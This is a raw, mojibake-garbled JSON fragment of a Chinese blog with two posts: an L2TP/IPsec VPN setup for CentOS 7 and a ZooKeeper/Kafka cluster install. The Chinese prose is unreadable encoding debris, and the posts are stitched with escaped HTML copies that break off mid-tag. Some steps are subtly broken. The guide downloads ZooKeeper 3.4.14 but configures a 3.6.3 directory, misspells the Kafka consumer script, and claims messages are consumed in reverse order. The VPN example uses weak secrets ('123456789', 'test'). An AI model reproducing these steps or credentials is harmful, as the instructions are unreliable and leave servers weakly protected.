xl2tpd libreswan äºŒã€ä¿®æ”¹æ ¸å¿ƒå‚æ•° # vi /etc/sysctl.conf vm.swappiness = 0 net.ipv4.neigh.default.gc_stale_time=120 net.ipv4.conf.all.rp_filter=0 net.ipv4.conf.default.rp_filter=0 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.all.arp_announce=2 net.ipv4.tcp_max_tw_buckets = 5000 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_synack_retries = 2 net.ipv4.conf.lo.arp_announce=2 net.ipv4.ip_forward = 1 net.ipv4.conf.default.accept_redirects = 0 net.ipv4.conf.default.send_redirects = 0 net.ipv4.conf.default.accept_source_route = 0 # sysctl -p ä¸‰ã€é…ç½® IPSEC # vi /etc/ipsec.d/l2tp_psk.conf conn L2TP-PSK-NAT rightsubnet=vhost:%priv also=L2TP-PSK-noNAT conn L2TP-PSK-noNAT authby=secret pfs=no auto=add keyingtries=3 dpddelay=30 dpdtimeout=120 dpdaction=clear rekey=no ikelifetime=8h keylife=1h type=transport left=192.168.10.232 leftprotoport=17/1701 right=%any rightprotoport=17/%any æ³¨æ„ä¸Šé¢çš„ left=192.168.10.232ï¼Œè¿™æ˜¯æœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¦æ›´æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨çš„åœ°å€ï¼ˆå¦‚æœåœ¨é˜²ç«å¢™åï¼Œå†™å†…ç½‘åœ°å€ï¼Œéæ˜ å°„åçš„å…¬ç½‘IPï¼‰\nç„¶åä¿®æ”¹å¯†é’¥ï¼Œä¹‹åå»ºç«‹L2TPçš„ iphone è¿æ¥æ—¶ä¼šç”¨åˆ°ï¼š\n# vim /etc/ipsec.secrets 192.168.10.232 %any: PSK \u0026#34;123456789\u0026#34; éªŒè¯ä¸€ä¸‹ï¼š\n# ipsec setup start\r# ipsec verify çœ‹åˆ°ä¸Šé¢ä¸¤è¡Œçº¢å­—ä¸è¦æ…Œå¼ ï¼ŒIgnoreï¼Œå¿½ç•¥æ‰å³å¯ã€‚æ˜¯å†…æ ¸ç‰¹æ€§ä¸­çš„reverse path filterç‰¹æ€§ï¼Œæ²¡å…³ç³»ã€‚\nç„¶åè®© ipsec è‡ªå¯åŠ¨\n# systemctl enable ipsec å››ã€é…ç½®xl2tpd # å…ˆå¤‡ä»½ # mv /etc/xl2tpd/xl2tpd.conf /etc/xl2tpd/xl2tpd.conf.old # vim /etc/xl2tpd/xl2tpd.conf [global] listen-addr = 192.168.10.232 ipsec saref = yes [lns default] ip range = 192.168.100.128-192.168.100.254 local ip = 192.168.100.99 require chap = yes refuse pap = yes require authentication = yes name = LinuxVPNserver ppp debug = yes pppoptfile = /etc/ppp/options.xl2tpd length bit = yes æ³¨æ„æ›´æ¢ä¸Šé¢ 192.168.10.232 çš„æœåŠ¡å™¨ipåœ°å€ï¼ŒåŒæ—¶è®°ä½name=LinuxVPNserver\n# å…ˆå¤‡ä»½ # mv /etc/ppp/options.xl2tpd /etc/ppp/options.xl2tpd.old # vim /etc/ppp/options.xl2tpd ipcp-accept-local ipcp-accept-remote ms-dns 8.8.8.8 ms-dns 4.2.2.4 noccp #noauth crtscts idle 1800 mtu 1410 mru 1410 nodefaultroute debug lock proxyarp connect-delay 5000 æœ€åç¼–è¾‘ç”¨æˆ·åå’Œå¯†ç \nvim /etc/ppp/chap-secrets # Secrets for authentication using CHAP # client server secret IP addresses test LinuxVPNserver test * æ³¨æ„æ ¼å¼ï¼Œç¬¬ä¸€åˆ—æ˜¯ç”¨æˆ·åï¼Œç¬¬äºŒåˆ—æ˜¯ä¸Šé¢xl2tpd.confä¸­è®°ä½çš„nameåï¼Œç¬¬ä¸‰åˆ—æ˜¯å¯†ç ï¼Œç¬¬å››åˆ—æ˜¯è·å–åˆ°çš„ipåœ°å€\nç„¶åå¯åŠ¨\n# systemctl start xl2tpd # systemctl enable xl2tpd # systemctl status xl2tpd äº”ã€é…ç½®é˜²ç«å¢™ iptables -A INPUT -p gre -j ACCEPT iptables -A OUTPUT -p gre -j ACCEPT iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT iptables -A FORWARD -s 192.168.100.0/24 -j ACCEPT iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE æ³¨æ„ä¸Šé¢çš„eth0ï¼Œæ ¹æ®æœåŠ¡å™¨çš„å…·ä½“æƒ…å†µè¿›è¡Œä¿®æ”¹\nç„¶åè¿™æ ·å°±å®Œæˆäº†ã€‚\nå…­ã€é…ç½®iphoneæ‰‹æœº é…ç½®å¥½æœåŠ¡å™¨ipï¼Œè´¦æˆ·ï¼Œå¯†ç ä»¥åŠå¯†é’¥å°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20221113-l2tp_vpn/","summary":"\u003cp\u003eè¿™æ˜¯ä¸ªå¾ˆå¥‡æ€ªçš„äº‹æƒ…ï¼Œåº”è˜äº†ä¸€å®¶æ CDN çš„å…¬å¸ï¼Œç»“æœä¸Šå»çœ‹äº†ä¸€ä¸‹æ ¹æœ¬ä¸å¯¹è·¯ã€‚å°±ç«‹åˆ»è¾äº†ï¼Œä½†æ˜¯å‘ç°å®ƒç»™å‘˜å·¥å¼€çš„ L2TP VPN ç¡®å®éå¸¸å¥½ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eäºæ˜¯å°±è‡ªå·±ä¹Ÿæ­ä¸€ä¸ªï¼Œæ–¹ä¾¿è‡ªç”¨ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œç¯å¢ƒæ˜¯CentOS 7\u003c/p\u003e\n\u003ch4 id=\"ä¸€è£…l2tp\"\u003eä¸€ã€è£…L2TP\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# yum install epel-release\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# yum install xl2tpd libreswan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒä¿®æ”¹æ ¸å¿ƒå‚æ•°\"\u003eäºŒã€ä¿®æ”¹æ ¸å¿ƒå‚æ•°\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/sysctl.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evm.swappiness \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.neigh.default.gc_stale_time\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.rp_filter\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.rp_filter\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.arp_announce \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.arp_announce\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_max_tw_buckets \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e5000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_syncookies \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_max_syn_backlog \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_synack_retries \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.lo.arp_announce\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.ip_forward \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.accept_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.send_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.accept_source_route \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# sysctl -p\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸‰é…ç½®-ipsec\"\u003eä¸‰ã€é…ç½® IPSEC\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/ipsec.d/l2tp_psk.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econn L2TP-PSK-NAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003erightsubnet\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evhost:%priv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003ealso\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eL2TP-PSK-noNAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econn L2TP-PSK-noNAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eauthby\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esecret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003epfs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eauto\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eadd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003ekeyingtries\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003edpddelay\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003edpdtimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003edpdaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eclear\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003erekey\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eikelifetime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e8h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003ekeylife\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etransport\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eleft\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.10.232\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eleftprotoport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e17/1701\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eright\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%any\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003erightprotoport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e17/%any\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢çš„ left=192.168.10.232ï¼Œè¿™æ˜¯æœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¦æ›´æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨çš„åœ°å€ï¼ˆå¦‚æœåœ¨é˜²ç«å¢™åï¼Œå†™å†…ç½‘åœ°å€ï¼Œéæ˜ å°„åçš„å…¬ç½‘IPï¼‰\u003c/p\u003e","title":"L2TP VPNåœ¨CentOS7ç³»ç»Ÿä¸‹çš„æ­å»º"},{"content":"ç”Ÿäº§ç¯å¢ƒè¦ç”¨åˆ°kafkaï¼Œè®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå…¶å®æœ€é‡è¦çš„ä¸æ˜¯å®‰è£…ï¼Œè€Œæ˜¯ä½¿ç”¨ã€‚\næ—¶é—´èŠ‚ç‚¹æ˜¯2022å¹´7æœˆ10æ—¥ï¼Œzookeeperçš„ç‰ˆæœ¬æ˜¯3.4.14ï¼š\nwget https://mirrors.cnnic.cn/apache/zookeeper/stable/zookeeper-3.4.14.tar.gz kafkaçš„ç‰ˆæœ¬æ˜¯3.2ï¼Œæ³¨æ„å‰é¢çš„2.13æ˜¯scalaçš„ç‰ˆæœ¬\nwget http://archive.apache.org/dist/kafka/3.2.0/kafka_2.13-3.2.0.tgz è½¯ä»¶éƒ½ä¸‹è½½å¥½ä»¥åï¼Œæ‰¾ä¸‰å°æœåŠ¡å™¨ï¼Œè½¯ä»¶éƒ½æ”¾åˆ° /usr/local è·¯å¾„ä¸‹ï¼š\næœåŠ¡å™¨çš„ipæ˜¯ï¼š\n172.18.31.50 172.18.31.51 172.18.31.52 ç§»åŠ¨è½¯ä»¶ï¼š\ntar zxvf zookeeper-3.4.14.tar.gz mv apache-zookeeper-3.6.3-bin /usr/local tar zxvf kafka_2.13-3.2.0.tgz mv kafka_2.13-3.2.0 /usr/local ç„¶åå¾—è£… java äº†ï¼Œcentos ç‰ˆæœ¬\nyum -y install epel-release yum -y install java-11-openjdk-devel é¦–å…ˆå»ç¼–è¾‘zookeeperçš„é…ç½®æ–‡ä»¶ï¼Œç„¶åå¯åŠ¨\ncp /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo_sample.cfg /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo.cfg ç¼–è¾‘zoo.cfgï¼Œå¢åŠ å‡ è¡Œ\ndataDir=/data/zookeeper metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider metricsProvider.httpPort=7000 metricsProvider.exportJvmInfo=true server.0=172.18.31.50:20881:30881 server.1=172.18.31.51:20881:30881 server.2=172.18.31.52:20881:30881 æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬çš„æ•°æ®ç›®å½•æ˜¯åœ¨/data/zookeeperï¼Œæ‰€ä»¥è¦å…ˆå»ºç«‹å¥½ç›®å½•ç»“æ„\nç„¶åæœ‰ä¸‰å°æœåŠ¡å™¨ä¹ˆï¼ŒæŠŠå„è‡ªçš„idæ”¾åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶å20881æ˜¯ä¸‰å°æœåŠ¡å™¨ä¹‹é—´çš„é€šè®¯ç«¯å£ï¼Œ30881æ˜¯é€‰ä¸¾ç«¯å£\nmkdir /data/zookeeper -p echo 0 \u0026gt;/data/zookeeper/myid ä¸‰å°æœåŠ¡å™¨åˆ†åˆ«å¯åŠ¨\n/usr/local/apache-zookeeper-3.6.3-bin/bin/zkServer.sh start éªŒè¯ä¸€ä¸‹\n/usr/local/apache-zookeeper-3.6.3-bin/bin/zkCli.sh [zk: localhost:2181(CONNECTED) 1] ls / [admin, brokers, cluster, config, consumers, controller, controller_epoch, feature, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper] çœ‹çœ‹ / ä¸‹æœ‰ä¸œè¥¿å°±è¡Œäº†ï¼Œä¸Šé¢æ˜¯å·²ç»è£…å¥½äº† kafka å’Œ cruisecontrolçš„æƒ…å½¢ï¼Œä¸œè¥¿å°±æ¯”è¾ƒå¤šäº†\nç„¶åè£… kafkaï¼Œå…ˆä¿®æ”¹é…ç½®æ–‡ä»¶\nvi /usr/local/kafka_2.13-3.2.0/config/server.properties #éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ broker.id=0 log.dirs=/data/kafka zookeeper.connect=172.18.31.50:2181,172.18.31.51:2181,172.18.31.52:2181 ç„¶åå¯åŠ¨å°±å¯ä»¥äº†\n/usr/local/kafka_2.13-3.2.0/bin/kafka-server-start.sh -daemon /usr/local/kafka_2.13-3.2.0/config/server.properties éªŒè¯ä¸€ä¸‹ï¼š\n# æ–°ç‰ˆçš„ kafka-topics.sh å‘½ä»¤å·²ç»å˜äº† cd /usr/local/kafka_2.13-3.2.0/bin # bootstrap-server å†™ä¸€ä¸ªå°±å¥½ï¼Œæˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª topic ï¼Œå«åš swimmingpool ./kafka-topics.sh --create --bootstrap-server 172.18.31.50:9092 --replication-factor 3 --partitions 3 --topic swimmingpool # çœ‹çœ‹ç»†èŠ‚ ./kafka-topics.sh --describe --bootstrap-server 172.18.31.50:9092 --topic swimmingpool Topic: swimmingpool TopicId: gOLXSh5NQPKMAwEroi_HcQ PartitionCount: 3 ReplicationFactor: 3 Configs: segment.bytes=1073741824 Topic: swimmingpool Partition: 0 Leader: 2 Replicas: 0,2,1 Isr: 2,1,0 Topic: swimmingpool Partition: 1 Leader: 2 Replicas: 2,1,0 Isr: 2,0,1 Topic: swimmingpool Partition: 2 Leader: 2 Replicas: 1,0,2 Isr: 2,0,1 # ç”Ÿäº§ä¸€äº›æ¶ˆæ¯ï¼Œctrl+c æ–­å‡º ./kafka-console-producer.sh --bootstrap-server 172.18.31.50:9092 --topic swimmingpool \u0026gt;i am ok \u0026gt;i am fine \u0026gt;i am good # æ¶ˆè´¹è¿™äº›æ¶ˆæ¯ï¼ŒåŒæ ·ç”¨ ctrl+c æ–­å‡ºï¼Œæ³¨æ„çœ‹ï¼Œæ¶ˆæ¯æ˜¯å€’åºçš„ ./kafka-consoconsumer.sh --bootstrap-server 172.18.31.50:9092 --topic swimmingpool --from-beginning i am good i am fine i am ok è¿™æ ·å°±è£…å¥½äº†ï¼Œä½†æ˜¯å®‰è£…åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œé‡è¦çš„æ˜¯ topic çš„ reblance ä»¥åŠ partion çš„é‡æ–°åˆ†å¸ƒ\n","permalink":"https://rendoumi.com/posts/20221113-kafka/","summary":"\u003cp\u003eç”Ÿäº§ç¯å¢ƒè¦ç”¨åˆ°kafkaï¼Œè®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå…¶å®æœ€é‡è¦çš„ä¸æ˜¯å®‰è£…ï¼Œè€Œæ˜¯ä½¿ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæ—¶é—´èŠ‚ç‚¹æ˜¯2022å¹´7æœˆ10æ—¥ï¼Œzookeeperçš„ç‰ˆæœ¬æ˜¯3.4.14ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://mirrors.cnnic.cn/apache/zookeeper/stable/zookeeper-3.4.14.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ekafkaçš„ç‰ˆæœ¬æ˜¯3.2ï¼Œæ³¨æ„å‰é¢çš„2.13æ˜¯scalaçš„ç‰ˆæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://archive.apache.org/dist/kafka/3.2.0/kafka_2.13-3.2.0.tgz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè½¯ä»¶éƒ½ä¸‹è½½å¥½ä»¥åï¼Œæ‰¾ä¸‰å°æœåŠ¡å™¨ï¼Œè½¯ä»¶éƒ½æ”¾åˆ° /usr/local è·¯å¾„ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eæœåŠ¡å™¨çš„ipæ˜¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e172.18.31.50\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e172.18.31.51\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e172.18.31.52\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç§»åŠ¨è½¯ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf zookeeper-3.4.14.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv apache-zookeeper-3.6.3-bin /usr/local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf kafka_2.13-3.2.0.tgz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv kafka_2.13-3.2.0 /usr/local\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå¾—è£… java äº†ï¼Œcentos ç‰ˆæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install java-11-openjdk-devel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé¦–å…ˆå»ç¼–è¾‘zookeeperçš„é…ç½®æ–‡ä»¶ï¼Œç„¶åå¯åŠ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo_sample.cfg /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘zoo.cfgï¼Œå¢åŠ å‡ è¡Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edataDir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/zookeeper\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetricsProvider.className\u003cspan class=\"o\"\u003e=\u003c/span\u003eorg.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetricsProvider.httpPort\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e7000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetricsProvider.exportJvmInfo\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver.0\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.50:20881:30881\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver.1\u003cspan 